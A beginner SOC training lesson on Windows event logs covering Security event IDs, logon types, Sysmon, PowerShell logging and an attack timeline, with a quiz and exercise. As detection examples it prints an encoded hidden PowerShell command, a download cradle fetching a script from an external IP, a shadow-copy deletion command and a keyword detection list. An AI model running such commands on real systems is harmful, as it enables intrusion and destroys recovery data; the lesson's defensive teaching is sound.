---
title: Windows Event Logs for Investigators
chapter: Windows evidence
summary: Learn which Windows Security, Sysmon and PowerShell events matter most to a SOC, how to read logon types and failure codes, and how to reconstruct an attacker's actions from event sequences.
duration: 60
level: beginner
objectives:
- Locate the main Windows event logs and explain what each records
- Interpret Event IDs 4624, 4625, 4672, 4688, 4720, 4732 and 1102, including logon types and status codes
- Describe the investigative value of Sysmon Event IDs 1, 3, 11 and 13 and PowerShell Event ID 4104
- Reconstruct an attack sequence from correlated events and identify logging gaps
prerequisites:
- TCP/IP, the Handshake and Suspicious Traffic
---

## Introduction

Windows remains the most common endpoint and server platform in enterprises, and its event logs are among the richest sources of evidence available to a SOC. They are also noisy and full of codes. This lesson focuses on the small set of events that answer most investigative questions: *who logged on, from where, how, with what privileges, and what did they run?*

## Where Windows logs live

Event logs are stored as `.evtx` files in `C:\Windows\System32\winevt\Logs\` and viewed with Event Viewer (`eventvwr.msc`), PowerShell or forwarded to a SIEM.

| Log | Contents | SOC value |
|---|---|---|
| **Security** | Logons, privilege use, account and group changes, process creation (if audited), policy changes | Highest — the primary investigative log |
| **System** | Services, drivers, shutdowns | Service installation (7045) is a persistence indicator |
| **Application** | Application-specific events | Varies; some security products log here |
| **Microsoft-Windows-Sysmon/Operational** | Detailed process, network, file and registry telemetry (when Sysmon is installed) | Very high |
| **Microsoft-Windows-PowerShell/Operational** | Script block logging (4104) | Very high for script-based attacks |
| **Microsoft-Windows-TaskScheduler/Operational** | Scheduled task creation/execution | Persistence and execution |

:::warning Auditing must be enabled
Many valuable events are not recorded by default. Process creation (4688) requires *Audit Process Creation*, and command lines require an additional policy setting. Script block logging must be enabled via Group Policy. **An absent event may mean "did not happen" or "was not audited" — always know which.**
:::

## The Security log: core events

### 4624 — An account was successfully logged on

The most important event to understand. Key fields: `TargetUserName`, `TargetDomainName`, `LogonType`, `IpAddress`, `WorkstationName`, `LogonProcessName`, `AuthenticationPackageName`, `TargetLogonId`.

**Logon types** tell you *how* the logon happened:

| Type | Name | Typical meaning |
|---|---|---|
| 2 | Interactive | Keyboard at the console |
| 3 | Network | Access to a share, or remote tool authentication (SMB, WinRM) |
| 4 | Batch | Scheduled task |
| 5 | Service | Service started under an account |
| 7 | Unlock | Workstation unlocked |
| 8 | NetworkCleartext | Credentials sent in clear text (e.g. basic auth to IIS) |
| 9 | NewCredentials | `runas /netonly` — often seen with credential misuse |
| 10 | RemoteInteractive | RDP / Terminal Services |
| 11 | CachedInteractive | Domain logon with cached credentials (no DC reachable) |

Investigative heuristics:

- **Type 10 from an unexpected source IP** → who is using RDP, and from where?
- **Type 3 from a workstation to many servers within minutes** → possible lateral movement.
- **Type 9** on a workstation, especially followed by network access → possible credential use for lateral movement (seen with "pass-the-hash" tooling).

### 4625 — An account failed to log on

Key fields: `TargetUserName`, `IpAddress`, `LogonType`, `Status` and `SubStatus`.

| SubStatus | Meaning |
|---|---|
| `0xC000006A` | Wrong password (username is valid) |
| `0xC0000064` | Username does not exist |
| `0xC0000234` | Account locked out |
| `0xC0000072` | Account disabled |
| `0xC000006F` | Logon outside permitted hours |
| `0xC0000071` | Password expired |

`0xC0000064` across many different names suggests **username enumeration**; `0xC000006A` for one name repeatedly suggests **brute force**; one or two failures across *many* valid names from one source suggests **password spraying**.

### 4672 — Special privileges assigned to new logon

Logged when an account with administrative-equivalent privileges logs on (e.g. `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`). Correlate with 4624 using `SubjectLogonId`/`TargetLogonId`. A 4672 for an account that *should not* be privileged is a red flag.

### 4688 — A new process has been created

When enabled with command-line auditing, records `NewProcessName`, `CommandLine`, `ParentProcessName` and the creator's logon ID. This is how you see *what was run*.

Suspicious examples:

```text
ParentProcessName: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
NewProcessName:    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine:       powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
```

Word spawning an encoded, hidden PowerShell command is a classic malicious macro pattern (ATT&CK **T1059.001**, **T1204.002**).

### Account and group management

| Event | Meaning |
|---|---|
| 4720 | User account created |
| 4722 | User account enabled |
| 4724 | Password reset attempted by another account |
| 4728 / 4732 / 4756 | Member added to a global / local / universal security group |
| 4740 | Account locked out |

An unexpected account creation (4720) followed by addition to `Administrators` (4732) is a common persistence technique (ATT&CK **T1136**, **T1098**).

### 1102 — The audit log was cleared

Clearing the Security log is rarely legitimate outside planned maintenance. Treat 1102 as high severity (ATT&CK **T1070.001**). Logs forwarded to the SIEM *before* the clear remain available — another reason to forward quickly.

### Other events worth knowing

- **4648** — Logon with explicit credentials (`runas`, some lateral-movement tools)
- **4768 / 4769 / 4771** — Kerberos TGT request / service ticket request / pre-authentication failure (domain controllers)
- **4776** — NTLM credential validation (domain controllers)
- **7045** (System log) — A service was installed
- **4698** — A scheduled task was created

## Sysmon: high-fidelity endpoint telemetry

Sysmon (System Monitor, part of Microsoft Sysinternals) is a free driver and service that logs detailed activity according to a configuration file. Commonly used community configurations exist; tune them to control volume.

| Sysmon ID | Event | Why it matters |
|---|---|---|
| 1 | Process creation (with hashes, parent, command line) | Richer than 4688; includes file hashes |
| 3 | Network connection | Links a process to a destination IP/port |
| 7 | Image loaded | DLL side-loading detection |
| 8 | CreateRemoteThread | Process injection |
| 10 | ProcessAccess | Access to `lsass.exe` → credential dumping (T1003.001) |
| 11 | File created | Dropped payloads, ransom notes |
| 13 | Registry value set | Persistence via Run keys (T1547.001) |
| 22 | DNS query | Which process resolved which domain |

Sysmon 3 + 22 answer the question network logs alone cannot: **which process** made the connection.

## PowerShell logging

PowerShell is both an essential admin tool and a favourite attacker tool. Enable:

- **Module logging** (Event ID 4103) — pipeline execution details
- **Script block logging** (Event ID **4104**) — the actual script content, *after* deobfuscation of encoded commands
- **Transcription** — text transcripts of sessions to a protected location

Example 4104 content revealing a download cradle:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')
```

Detect patterns such as `IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, `-EncodedCommand`, `Net.WebClient`, `Invoke-WebRequest` combined with execution, and AMSI bypass strings. Expect false positives from legitimate admin scripts; build allow-lists by signer, path and parent process.

## Querying logs on a host

When you have authorised access to a host, PowerShell can query logs directly:

```powershell
# Last 20 failed logons with source IP and substatus
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 20 |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    [pscustomobject]@{
      Time      = $_.TimeCreated
      User      = ($x.Event.EventData.Data | Where-Object Name -eq 'TargetUserName').'#text'
      SourceIP  = ($x.Event.EventData.Data | Where-Object Name -eq 'IpAddress').'#text'
      SubStatus = ($x.Event.EventData.Data | Where-Object Name -eq 'SubStatus').'#text'
    }
  }

# RDP logons (type 10) in the last 24 hours
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=(Get-Date).AddDays(-1)} |
  Where-Object { $_.Properties[8].Value -eq 10 }
```

In a SIEM such as Microsoft Sentinel, the same data is queried with KQL in the `SecurityEvent` table — the subject of the KQL module.

## Reconstructing an attack sequence

:::scenario Timeline from Windows events (host FS-01, times in UTC)
```text
01:52:10  4625  user=svc_backup  type=3  ip=10.0.9.77  sub=0xC000006A   (x38 in 4 min)
01:56:41  4624  user=svc_backup  type=3  ip=10.0.9.77
01:56:41  4672  user=svc_backup  privileges=SeBackupPrivilege, SeDebugPrivilege...
01:58:03  4688  parent=services.exe  new=C:\Windows\Temp\upd.exe
01:58:05  Sysmon 3  image=upd.exe  dst=198.51.100.77:443
02:03:17  4720  new account=helpdesk2   by=svc_backup
02:03:20  4732  helpdesk2 added to Administrators
02:10:44  4688  vssadmin.exe delete shadows /all /quiet
02:11:02  1102  Security log cleared  by=helpdesk2
```

**Reading:** a brute-force attack from internal host 10.0.9.77 succeeds against a privileged service account; a binary is run from `C:\Windows\Temp` and connects to an external server (likely C2); a backdoor admin account is created; shadow copies are deleted (ransomware preparation); and logs are cleared to hinder investigation. Because events were forwarded to the SIEM, the clear at 02:11 did not erase this timeline.

**Immediate actions:** isolate FS-01 and 10.0.9.77, disable `svc_backup` and `helpdesk2`, block 198.51.100.77, preserve memory and disk if possible, and escalate as a major incident.
:::

## Common mistakes

- **Reading 4624 without the logon type.** A type 5 (service) logon and a type 10 (RDP) logon mean very different things.
- **Assuming the `IpAddress` field is always populated.** Local logons show `-` or `127.0.0.1`.
- **Ignoring machine accounts** (names ending in `$`). They are usually noise — but not always (e.g. relay attacks).
- **Concluding "no evidence" when auditing was off.** Document logging gaps as findings.
- **Treating PowerShell use as inherently malicious.** Context — parent process, user, script content, signer — decides.

## Security implications

- Deploy a baseline audit policy (logon, account management, process creation with command line, policy change) and Sysmon on servers and high-value workstations.
- Forward logs in near real time and protect the forwarding pipeline.
- Alert on 1102, unexpected 4720/4732, and Office applications spawning script interpreters.

## Knowledge check

:::check Questions
1. What does logon type 10 indicate?
2. A 4625 has SubStatus `0xC0000064`. What does that tell you?
3. Which Sysmon event links a process to a network destination?
4. Why is Event ID 4104 more useful than seeing `-EncodedCommand` in a 4688 command line?
:::

:::solution Answers
1. A **RemoteInteractive** logon — typically RDP.
2. The **username does not exist** — repeated across names, this suggests username enumeration.
3. **Sysmon Event ID 3** (network connection).
4. 4104 records the **decoded script block content**, so you can see what the encoded command actually did.
:::

## Exercise

Using the timeline in the scenario above:

1. Which MITRE ATT&CK techniques can you identify? Give at least four.
2. Which single event would you use to determine the exact privileges obtained?
3. What logging gap would have hidden the 02:10:44 activity entirely?

:::solution Model answer
1. **T1110** Brute Force (01:52); **T1078** Valid Accounts (01:56); **T1071** Application Layer Protocol / C2 (01:58); **T1136.001** Create Local Account and **T1098** Account Manipulation (02:03); **T1490** Inhibit System Recovery (02:10); **T1070.001** Clear Windows Event Logs (02:11).
2. **4672** — it lists the special privileges assigned to the logon session.
3. If **process creation auditing with command-line logging** (or Sysmon Event ID 1) had not been enabled, the `vssadmin` command would not have been recorded.
:::

## Summary and next steps

- The Security log answers who, how and with what privileges; Sysmon and PowerShell logs answer what ran and where it connected.
- Logon types and failure substatus codes turn raw events into meaning.
- Correlated sequences — not single events — reveal attacks. Know your logging gaps.

In the **KQL and Detection Engineering** module you will turn these events into automated detections.

===assignment===
On a Windows lab VM you control, enable *Audit Process Creation* with command-line logging and PowerShell script block logging. Perform three benign actions (open Notepad, run `Get-Process` in PowerShell, create a local test user and delete it). Export the resulting events (4688, 4104, 4720, 4726) and annotate each with what it shows.

===criteria===
- Complete the reading, knowledge check and exercise.
- Mark the lesson complete; the brute-force lab in the KQL module builds directly on these event IDs.

===references===
- Microsoft, *Audit logon events* and Event 4624 reference — https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4624
- Microsoft, Event 4625 reference — https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4625
- Microsoft Sysinternals, *Sysmon* — https://learn.microsoft.com/sysinternals/downloads/sysmon
- Microsoft, *about_Logging_Windows* (PowerShell) — https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging_windows
- MITRE ATT&CK T1070.001, Clear Windows Event Logs — https://attack.mitre.org/techniques/T1070/001/
